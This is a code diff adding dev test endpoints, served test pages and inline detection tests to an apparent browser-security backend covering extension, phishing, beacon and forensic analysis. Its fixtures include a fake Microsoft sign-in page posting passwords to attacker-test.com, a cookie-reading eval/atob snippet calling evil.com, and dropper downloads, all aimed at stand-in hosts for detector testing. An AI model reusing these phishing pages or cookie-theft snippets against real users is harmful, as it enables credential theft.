@@ -8,13 +8,15 @@ import sys, os, asyncio
 if sys.platform == "win32":
     asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
 
-import json, tempfile
+import json, tempfile, subprocess, time as _time, re as _re
 from datetime import datetime
 from typing import List, Optional, Set
 
+_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+
 from fastapi import FastAPI, File, HTTPException, Response, UploadFile, WebSocket, WebSocketDisconnect
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, StreamingResponse
 from pydantic import BaseModel
 
 # ── C1 — Malicious Browser Extension Analyzer ─────────────────────────────────
@@ -137,12 +139,33 @@ alerts: list = []
 c1_history: list = []
 _pending_installs: dict = {}
 
-settings: dict = {
+_SETTINGS_FILE = os.path.join(os.path.dirname(__file__), "settings.json")
+
+_SETTINGS_DEFAULTS: dict = {
     "layers": {"l1": True, "l2": True, "l3": True, "l4": True, "l5": True},
     "whitelist": [],
     "gsb_key": "",
     "pw_home_url": "",
 }
+
+def _load_settings() -> dict:
+    try:
+        with open(_SETTINGS_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        merged = dict(_SETTINGS_DEFAULTS)
+        merged.update(data)
+        return merged
+    except (FileNotFoundError, json.JSONDecodeError):
+        return dict(_SETTINGS_DEFAULTS)
+
+def _save_settings(s: dict) -> None:
+    try:
+        with open(_SETTINGS_FILE, "w", encoding="utf-8") as f:
+            json.dump(s, f, indent=2)
+    except Exception:
+        pass
+
+settings: dict = _load_settings()
 
 # ── Request / response models ──────────────────────────────────────────────────
 class AnalyzeReq(BaseModel):
@@ -253,6 +276,7 @@ async def get_alerts(limit: int = 50):
 async def save_settings(req: SettingsReq):
     settings.update({"layers": req.layers, "whitelist": req.whitelist,
                       "gsb_key": req.gsb_key, "pw_home_url": req.pw_home_url})
+    _save_settings(settings)
     return {"status": "saved"}
 
 
@@ -476,6 +500,439 @@ async def block_install(req: ApproveInstallReq):
     _pending_installs.pop(req.ext_id, None)
     await _broadcast({"type": "c1_install_blocked", "ext_id": req.ext_id})
     return {"status": "blocked", "ext_id": req.ext_id}
+
+
+def _run_test_component(label: str, script: str) -> dict:
+    """Run a test script as a subprocess and parse unittest -v output."""
+    start = _time.time()
+    try:
+        proc = subprocess.run(
+            [sys.executable, script, "-v"],
+            capture_output=True, text=True, timeout=120,
+            cwd=_REPO_ROOT, encoding="utf-8", errors="replace"
+        )
+        output = proc.stderr + "\n" + proc.stdout  # unittest writes to stderr
+        elapsed = _time.time() - start
+
+        tests = []
+        # unittest -v format: "test_name (module.ClassName) ... ok"
+        # Python 3.11+ adds the test method in the class name too
+        for line in output.splitlines():
+            m = _re.match(r"^(test\w+)\s+\(([^)]+)\)\s+\.\.\.\s+(ok|FAIL|ERROR|skipped.*)", line)
+            if m:
+                tname, tclass, tstatus = m.group(1), m.group(2).split(".")[-1], m.group(3)
+                tests.append({"name": tname, "cls": tclass,
+                               "status": "pass" if tstatus == "ok" else "skip" if tstatus.startswith("skipped") else "fail"})
+            else:
+                # C4 script format: "  PASS  description" or "  FAIL  description"
+                m2 = _re.match(r"^\s+(PASS|FAIL)\s+(.+)", line)
+                if m2:
+                    tests.append({"name": m2.group(2).strip()[:80], "cls": "",
+                                   "status": "pass" if m2.group(1) == "PASS" else "fail"})
+
+        # Extract failure/error detail blocks
+        fail_blocks: dict = {}
+        current_key = None
+        for line in output.splitlines():
+            if line.startswith("FAIL: ") or line.startswith("ERROR: "):
+                current_key = line.split(": ", 1)[1].split(" ")[0]
+                fail_blocks[current_key] = []
+            elif current_key and line.startswith("-" * 10):
+                continue
+            elif current_key:
+                if line.startswith("=" * 10):
+                    current_key = None
+                else:
+                    fail_blocks[current_key].append(line)
+
+        # Attach error messages to tests
+        for t in tests:
+            if t["status"] == "fail":
+                key = t["name"]
+                if key in fail_blocks:
+                    t["message"] = "\n".join(fail_blocks[key]).strip()
+
+        passed = sum(1 for t in tests if t["status"] == "pass")
+        failed = sum(1 for t in tests if t["status"] == "fail")
+
+        # Fallback: if no tests parsed, check return code
+        if not tests:
+            # Try to parse summary line: "Ran X tests in Y.Ys"
+            m_ran = _re.search(r"Ran (\d+) test", output)
+            total = int(m_ran.group(1)) if m_ran else 0
+            ok_m = _re.search(r"OK", output)
+            passed = total if ok_m else 0
+            failed = total - passed
+
+        return {
+            "label": label,
+            "passed": passed,
+            "failed": failed,
+            "total": len(tests) if tests else (passed + failed),
+            "duration": round(elapsed, 2),
+            "tests": tests,
+            "stdout": output[-3000:],  # last 3000 chars for debugging
+            "returncode": proc.returncode,
+        }
+    except subprocess.TimeoutExpired:
+        return {"label": label, "passed": 0, "failed": 0, "total": 0,
+                "duration": 120, "tests": [], "stdout": "Timeout after 120s", "returncode": -1}
+    except Exception as exc:
+        return {"label": label, "passed": 0, "failed": 0, "total": 0,
+                "duration": 0, "tests": [], "stdout": str(exc), "returncode": -1}
+
+
+@app.post("/dev/run_tests")
+async def run_tests(component: str = "all"):
+    """Run unit test suites and return structured results."""
+    components_map = {
+        "c1": ("C1 — Extension Analyzer",   os.path.join(_REPO_ROOT, "test", "C1", "test_c1_units.py")),
+        "c2": ("C2 — Phishing Detection",   os.path.join(_REPO_ROOT, "test", "C2", "test_c2_layers.py")),
+        "c3": ("C3 — Beacon Detector",      os.path.join(_REPO_ROOT, "test", "C3", "test_c3_units.py")),
+        "c4": ("C4 — Forensic Correlation", os.path.join(_REPO_ROOT, "test", "C4", "test_correlation.py")),
+    }
+    targets = list(components_map.items()) if component == "all" else \
+              [(component, components_map[component])] if component in components_map else []
+
+    loop = asyncio.get_event_loop()
+    results = []
+    for cid, (label, script) in targets:
+        r = await loop.run_in_executor(None, _run_test_component, label, script)
+        r["id"] = cid
+        results.append(r)
+
+    total_passed = sum(r["passed"] for r in results)
+    total_failed = sum(r["failed"] for r in results)
+    total_duration = sum(r["duration"] for r in results)
+    return {
+        "components": results,
+        "total_passed": total_passed,
+        "total_failed": total_failed,
+        "total_duration": round(total_duration, 2),
+    }
+
+
+_TEST_PAGES: dict = {
+    "c2-phish": """<!DOCTYPE html><html><head><title>Secure Login - Microsoft</title></head><body>
+<iframe style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;border:none;"
+        src="https://login.evil-test.com/oauth"></iframe>
+<form action="https://attacker-test.com/steal" method="POST">
+  <input type="password" name="pass" placeholder="Password"/>
+  <input type="hidden" name="token" value="abc123"/>
+</form>
+<script src="https://cdn.evil-test.com/tracker.js"></script>
+<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
+            background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 32px rgba(0,0,0,.3);
+            font-family:Segoe UI,sans-serif;text-align:center;z-index:99998">
+  <h2 style="color:#0078d4">Sign in to Microsoft</h2>
+  <input type="email" placeholder="Email" style="display:block;width:280px;padding:8px;margin:12px auto;border:1px solid #ccc;border-radius:4px"/>
+  <input type="password" placeholder="Password" style="display:block;width:280px;padding:8px;margin:12px auto;border:1px solid #ccc;border-radius:4px"/>
+  <button style="background:#0078d4;color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer">Next</button>
+  <p style="font-size:11px;color:#888;margin-top:12px">WebSentinel C2 Phishing Test Page</p>
+</div>
+</body></html>""",
+
+    "c2-clean": """<!DOCTYPE html><html><head><title>My Blog</title></head><body>
+<h1>Welcome to My Blog</h1><p>This is a perfectly safe page with no phishing indicators.</p>
+<article><h2>Article Title</h2><p>Some content here.</p></article>
+<footer><p>Copyright 2024 My Blog</p></footer>
+</body></html>""",
+
+    "c3-beacon": """<!DOCTYPE html><html><head><title>Beacon Test</title></head><body>
+<h2>C3 Beacon Simulation Test</h2>
+<p>This page simulates C2 beacon behavior for testing purposes.</p>
+<script>
+// Simulate regular beacon requests (for test visualization only)
+let seq = 0;
+function sendBeacon() {
+  console.log('[C3-TEST] Beacon seq=' + seq++);
+}
+setInterval(sendBeacon, 5000);
+</script>
+</body></html>""",
+}
+
+@app.get("/dev/test-page/{name}")
+async def serve_test_page(name: str):
+    html = _TEST_PAGES.get(name)
+    if not html:
+        return HTMLResponse("<html><body>Test page not found</body></html>", status_code=404)
+    return HTMLResponse(html)
+
+
+# ── Inline test cases ─────────────────────────────────────────────────────────
+
+async def _tc_c1_benign_manifest():
+    from .c1.features import extract_manifest_features
+    manifest = {"name": "Simple", "version": "1.0", "manifest_version": 3, "permissions": ["storage"]}
+    feats = extract_manifest_features(manifest, "")
+    assert feats["has_webRequest"] == 0.0, "has_webRequest should be 0"
+    assert feats["has_all_urls"] == 0.0, "has_all_urls should be 0"
+    assert feats["total_permission_count"] == 1.0, "total_permission_count should be 1"
+    return {"detail": "storage-only manifest → all high-risk features = 0"}
+
+async def _tc_c1_malicious_manifest():
+    from .c1.features import extract_manifest_features
+    manifest = {
+        "name": "Evil", "version": "1.0", "manifest_version": 3,
+        "permissions": ["webRequest", "cookies", "tabs", "nativeMessaging"],
+        "host_permissions": ["<all_urls>"],
+        "background": {"service_worker": "bg.js"},
+        "content_scripts": [{"matches": ["<all_urls>"], "js": ["inject.js"]}],
+    }
+    feats = extract_manifest_features(manifest, "")
+    assert feats["has_webRequest"] == 1.0
+    assert feats["has_all_urls"] == 1.0
+    assert feats["has_nativeMessaging"] == 1.0
+    assert feats["has_background_script"] == 1.0
+    return {"detail": f"malicious manifest → 4 high-risk flags confirmed"}
+
+async def _tc_c1_code_eval_detection():
+    from .c1.features import extract_manifest_features
+    manifest = {"name": "T", "version": "1", "manifest_version": 3, "permissions": []}
+    code = "eval(atob('aGVsbG8=')); document.cookie; fetch('https://evil.com/c2');"
+    feats = extract_manifest_features(manifest, code)
+    assert feats["eval_count"] > 0, "eval not detected"
+    assert feats["atob_count"] > 0, "atob not detected"
+    assert feats["cookie_in_code"] > 0, "cookie access not detected"
+    assert feats["xhr_fetch_count"] > 0, "fetch not detected"
+    return {"detail": f"eval={feats['eval_count']}, atob={feats['atob_count']}, cookie={feats['cookie_in_code']}, fetch={feats['xhr_fetch_count']}"}
+
+async def _tc_c1_entropy():
+    from .c1.features import _shannon_entropy
+    clean = _shannon_entropy("console.log('hello world');")
+    obf = _shannon_entropy("var _0x1a=['\\x68\\x65\\x6c\\x6c\\x6f'];eval(atob('aGVsbG8='));_0x1a[0x0];")
+    assert clean >= 0.0
+    assert obf > 0.0
+    return {"detail": f"clean={clean:.2f} bits, obfuscated={obf:.2f} bits"}
+
+async def _tc_c2_url_phishing():
+    score_data = await check_url("http://paypal-secure-login.yolasite.com/update")
+    assert score_data["score"] > 0.0, f"Phishing URL scored 0: {score_data}"
+    return {"detail": f"paypal-secure-login.yolasite.com → score={score_data['score']:.3f}"}
+
+async def _tc_c2_url_benign():
+    score_data = await check_url("https://www.google.com/search?q=python")
+    assert score_data["score"] < 0.8, f"Benign URL scored too high: {score_data['score']}"
+    return {"detail": f"google.com → score={score_data['score']:.3f} (below 0.80 threshold)"}
+
+async def _tc_c2_form_offsite():
+    dom = """<html><body><form action="https://attacker.com/steal" method="POST">
+    <input type="password" name="pass"/></form></body></html>"""
+    res = await check_form("https://legitimate-bank.com/login", dom)
+    assert res["score"] > 0.5, f"Off-domain form scored {res['score']}"
+    return {"detail": f"form→attacker.com from legitimate-bank.com → score={res['score']:.2f}"}
+
+async def _tc_c2_form_samedomain():
+    dom = """<html><body><form action="/submit" method="POST">
+    <input type="password" name="pass"/></form></body></html>"""
+    res = await check_form("https://mybank.com/login", dom)
+    assert res["score"] == 0.0, f"Same-domain form scored {res['score']} (expected 0)"
+    return {"detail": f"form→/submit from mybank.com → score=0.00 (safe)"}
+
+async def _tc_c2_browser_phish():
+    """Navigate Playwright browser to phishing test page and analyze live."""
+    test_url = "http://127.0.0.1:8765/dev/test-page/c2-phish"
+    phish_html = _TEST_PAGES["c2-phish"]
+    # Navigate browser to the test page (visual demonstration)
+    if pw_session.is_running():
+        try:
+            await pw_session.navigate(test_url)
+        except Exception:
+            pass
+    # Run C2 analysis on the phishing HTML directly
+    res = await check_bitb(test_url, phish_html)
+    assert res["score"] > 0.3, f"Phishing page scored too low: {res['score']}"
+    url_res = await check_url(test_url)
+    form_res = await check_form(test_url, phish_html)
+    rep_res  = await check_reputation(test_url, settings.get("gsb_key", ""))
+    combined = round(min(1.0, res["score"] * 0.35 + url_res["score"] * 0.30 + form_res["score"] * 0.20 + rep_res["score"] * 0.15), 3)
+    return {
+        "detail": f"BitB={res['score']:.2f} URL={url_res['score']:.2f} Form={form_res['score']:.2f} → combined={combined:.2f}",
+        "browser_url": test_url,
+    }
+
+async def _tc_c2_browser_clean():
+    """Navigate Playwright browser to clean test page and verify low score."""
+    test_url = "http://127.0.0.1:8765/dev/test-page/c2-clean"
+    clean_html = _TEST_PAGES["c2-clean"]
+    if pw_session.is_running():
+        try:
+            await pw_session.navigate(test_url)
+        except Exception:
+            pass
+    res = await check_bitb(test_url, clean_html)
+    assert res["score"] < 0.8, f"Clean page scored too high: {res['score']}"
+    return {
+        "detail": f"Clean blog page → BitB score={res['score']:.2f} (below 0.80 threshold)",
+        "browser_url": test_url,
+    }
+
+async def _tc_c3_beacon_iat():
+    from .c3.feature_engine import compute_features
+    import time as _t
+    now = _t.time()
+    events = [{"timestamp": now + i * 5.0, "url": "http://c2.evil/beacon",
+               "method": "GET", "size_bytes": 256, "idle_time_ms": 4800,
+               "user_was_active": False, "is_background_tab": True, "is_extension_origin": False}
+              for i in range(20)]
+    feats = compute_features(events)
+    assert feats["iat_cv"] < 0.10, f"Beacon IAT CV too high: {feats['iat_cv']}"
+    assert feats["background_tab_ratio"] == 1.0
+    return {"detail": f"20 regular beacons @5s → IAT-CV={feats['iat_cv']:.4f} BG-ratio={feats['background_tab_ratio']:.2f}"}
+
+async def _tc_c3_human_iat():
+    from .c3.feature_engine import compute_features
+    import time as _t
+    now = _t.time()
+    urls = ["https://github.com", "https://google.com", "https://stackoverflow.com",
+            "https://wikipedia.org", "https://news.ycombinator.com"]
+    events = [{"timestamp": now + sum(range(i + 1)) * (3 + i % 7),
+               "url": urls[i % len(urls)], "method": "GET", "size_bytes": 50000 + i * 1200,
+               "idle_time_ms": 100, "user_was_active": True, "is_background_tab": False,
+               "is_extension_origin": False}
+              for i in range(15)]
+    feats = compute_features(events)
+    assert feats["iat_cv"] > 0.10, f"Human browsing IAT CV too low: {feats['iat_cv']}"
+    assert feats["user_active_ratio"] == 1.0
+    return {"detail": f"15 human browsing events → IAT-CV={feats['iat_cv']:.4f} (irregular, >0.10)"}
+
+async def _tc_c3_fusion_beacon():
+    from .c3.risk_fusion import C3RiskFusion
+    fusion = C3RiskFusion()
+    result = fusion.fuse(anomaly=0.8, reputation=0.9, heuristic=0.7)
+    assert result["verdict"] == "BEACON", f"Expected BEACON, got {result['verdict']}"
+    assert result["score"] >= 0.6
+    return {"detail": f"anomaly=0.8 rep=0.9 heuristic=0.7 → verdict={result['verdict']} score={result['score']:.2f}"}
+
+async def _tc_c3_fusion_safe():
+    from .c3.risk_fusion import C3RiskFusion
+    fusion = C3RiskFusion()
+    result = fusion.fuse(anomaly=0.0, reputation=0.0, heuristic=0.0)
+    assert result["verdict"] == "SAFE", f"Expected SAFE, got {result['verdict']}"
+    return {"detail": f"all signals=0 → verdict={result['verdict']} score={result['score']:.2f}"}
+
+async def _tc_c4_cooccurrence():
+    from .c4.rules import apply_single_artifact_rules
+    from .c4.correlation import run_correlation
+    from datetime import datetime, timedelta
+    t0 = datetime(2024, 3, 15, 14, 0, 0)
+    def ev(ts, atype, detail, risk=False):
+        return {"timestamp": ts.isoformat(), "artifact_type": atype, "source_file": "test",
+                "detail": detail, "risk_flag": risk, "risk_reasons": [], "anomaly_score": 0,
+                "anomaly_reasons": [], "rule_flags": []}
+    events = [
+        ev(t0, "history", {"url": "https://evil-c4-test.com/login"}, risk=True),
+        ev(t0 + timedelta(seconds=30), "cookie", {"host": ".evil-c4-test.com", "name": "session", "path": "/", "secure": True, "httponly": True}, risk=True),
+        ev(t0 + timedelta(seconds=90), "credential", {"origin": "https://evil-c4-test.com", "username": "victim", "times_used": 0, "password": "[ENCRYPTED]"}, risk=True),
+    ]
+    events = apply_single_artifact_rules(events)
+    corr = run_correlation(events)
+    cooc = corr["cooccurrence"]
+    assert any("evil-c4-test.com" in str(f.get("domain","")) for f in cooc), "Co-occurrence not detected"
+    return {"detail": f"history+cookie+credential on evil-c4-test.com → {len(cooc)} co-occurrence cluster(s)"}
+
+async def _tc_c4_attack_chain():
+    from .c4.rules import apply_single_artifact_rules
+    from .c4.correlation import run_correlation
+    from datetime import datetime, timedelta
+    t0 = datetime(2024, 3, 15, 20, 0, 0)
+    def ev(ts, atype, detail, risk=False):
+        return {"timestamp": ts.isoformat(), "artifact_type": atype, "source_file": "test",
+                "detail": detail, "risk_flag": risk, "risk_reasons": [], "anomaly_score": 0,
+                "anomaly_reasons": [], "rule_flags": []}
+    events = [
+        ev(t0, "history", {"url": "https://phish-chain-test.net/update"}, risk=True),
+        ev(t0 + timedelta(seconds=40), "download", {"filename": "update.exe", "source_url": "https://phish-chain-test.net/update.exe", "size_bytes": 1024000, "danger_type": 1}, risk=True),
+        ev(t0 + timedelta(seconds=90), "credential", {"origin": "https://phish-chain-test.net", "username": "victim", "times_used": 0, "password": "[ENCRYPTED]"}, risk=True),
+    ]
+    events = apply_single_artifact_rules(events)
+    corr = run_correlation(events)
+    chains = corr["attack_chains"]
+    assert len(chains) > 0, "No attack chain detected"
+    return {"detail": f"browse→download.exe→credential on phish-chain-test.net → {len(chains)} chain(s) detected"}
+
+async def _tc_c4_mitre():
+    from .c4.rules import apply_single_artifact_rules
+    from .c4.correlation import run_correlation
+    from .c4.mitre import run_mitre_mapping
+    from datetime import datetime, timedelta
+    t0 = datetime(2024, 3, 15, 14, 0, 0)
+    def ev(ts, atype, detail, risk=False):
+        return {"timestamp": ts.isoformat(), "artifact_type": atype, "source_file": "test",
+                "detail": detail, "risk_flag": risk, "risk_reasons": [], "anomaly_score": 0,
+                "anomaly_reasons": [], "rule_flags": []}
+    events = [
+        ev(t0, "history", {"url": "https://mitre-test.ru/cmd"}, risk=True),
+        ev(t0 + timedelta(minutes=1), "download", {"filename": "dropper.ps1", "source_url": "https://mitre-test.ru/dropper.ps1", "size_bytes": 8192, "danger_type": 1}, risk=True),
+        ev(t0 + timedelta(minutes=2), "credential", {"origin": "https://mitre-test.ru", "username": "target", "times_used": 0, "password": "[ENCRYPTED]"}, risk=True),
+    ]
+    events = apply_single_artifact_rules(events)
+    corr = run_correlation(events)
+    mitre = run_mitre_mapping(corr, events)
+    findings = mitre["all_findings"]
+    assert len(findings) > 0, "No MITRE findings"
+    high = mitre["by_severity"]["High"]
+    return {"detail": f"{len(findings)} MITRE ATT&CK findings — High:{high} Medium:{mitre['by_severity']['Medium']} Low:{mitre['by_severity']['Low']}"}
+
+
+_ALL_TEST_CASES = [
+    {"id":"c1_benign",    "component":"c1","label":"Benign manifest → no risk flags",         "fn":_tc_c1_benign_manifest},
+    {"id":"c1_malicious", "component":"c1","label":"Malicious manifest → 4 high-risk flags",  "fn":_tc_c1_malicious_manifest},
+    {"id":"c1_code_eval", "component":"c1","label":"Code: eval + atob + fetch + cookie detected","fn":_tc_c1_code_eval_detection},
+    {"id":"c1_entropy",   "component":"c1","label":"Shannon entropy: obfuscated > clean",      "fn":_tc_c1_entropy},
+    {"id":"c2_url_phish", "component":"c2","label":"URL: paypal-secure-login.yolasite.com flagged","fn":_tc_c2_url_phishing},
+    {"id":"c2_url_clean", "component":"c2","label":"URL: google.com scores below threshold",  "fn":_tc_c2_url_benign},
+    {"id":"c2_form_off",  "component":"c2","label":"Form: off-domain POST → score > 0.5",     "fn":_tc_c2_form_offsite},
+    {"id":"c2_form_same", "component":"c2","label":"Form: same-domain POST → score = 0",      "fn":_tc_c2_form_samedomain},
+    {"id":"c2_browser_phish","component":"c2","label":"[Browser] BitB phishing page → detected live","fn":_tc_c2_browser_phish,"browser":True},
+    {"id":"c2_browser_clean","component":"c2","label":"[Browser] Clean page → low score",     "fn":_tc_c2_browser_clean,"browser":True},
+    {"id":"c3_beacon_iat","component":"c3","label":"Beacon events: IAT-CV < 0.10 (clockwork timing)","fn":_tc_c3_beacon_iat},
+    {"id":"c3_human_iat", "component":"c3","label":"Human browsing: IAT-CV > 0.10 (irregular)","fn":_tc_c3_human_iat},
+    {"id":"c3_fusion_beacon","component":"c3","label":"Risk fusion: BEACON verdict at high signals","fn":_tc_c3_fusion_beacon},
+    {"id":"c3_fusion_safe","component":"c3","label":"Risk fusion: SAFE verdict at zero signals","fn":_tc_c3_fusion_safe},
+    {"id":"c4_cooccurrence","component":"c4","label":"Co-occurrence: history+cookie+credential on same domain","fn":_tc_c4_cooccurrence},
+    {"id":"c4_attack_chain","component":"c4","label":"Attack chain: browse→download.exe→credential","fn":_tc_c4_attack_chain},
+    {"id":"c4_mitre",     "component":"c4","label":"MITRE ATT&CK mapping on attack scenario", "fn":_tc_c4_mitre},
+]
+
+
+@app.get("/dev/run_tests_stream")
+async def run_tests_stream_endpoint(component: str = "all"):
+    """SSE stream: runs test cases one by one and emits results."""
+    cases = [tc for tc in _ALL_TEST_CASES
+             if component == "all" or tc["component"] == component]
+
+    async def generate():
+        total = len(cases)
+        yield f"data: {json.dumps({'type':'init','total':total})}\n\n"
+        passed = 0
+        failed = 0
+        for i, tc in enumerate(cases):
+            yield f"data: {json.dumps({'type':'start','index':i,'id':tc['id'],'label':tc['label'],'component':tc['component'],'browser':tc.get('browser',False)})}\n\n"
+            start = _time.time()
+            try:
+                result = await tc["fn"]()
+                elapsed = round(_time.time() - start, 2)
+                passed += 1
+                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'pass','elapsed':elapsed,'detail':result.get('detail',''),'browser_url':result.get('browser_url','')})}\n\n"
+            except AssertionError as e:
+                elapsed = round(_time.time() - start, 2)
+                failed += 1
+                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'fail','elapsed':elapsed,'detail':str(e),'browser_url':''})}\n\n"
+            except Exception as e:
+                elapsed = round(_time.time() - start, 2)
+                failed += 1
+                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'error','elapsed':elapsed,'detail':str(e),'browser_url':''})}\n\n"
+            # small pause between tests so browser has time to display the page
+            await asyncio.sleep(0.3)
+        yield f"data: {json.dumps({'type':'done','passed':passed,'failed':failed,'total':total})}\n\n"
+
+    return StreamingResponse(
+        generate(),
+        media_type="text/event-stream",
+        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no", "Connection": "keep-alive"},
+    )
 
 
 @app.post("/dev/simulate_click")
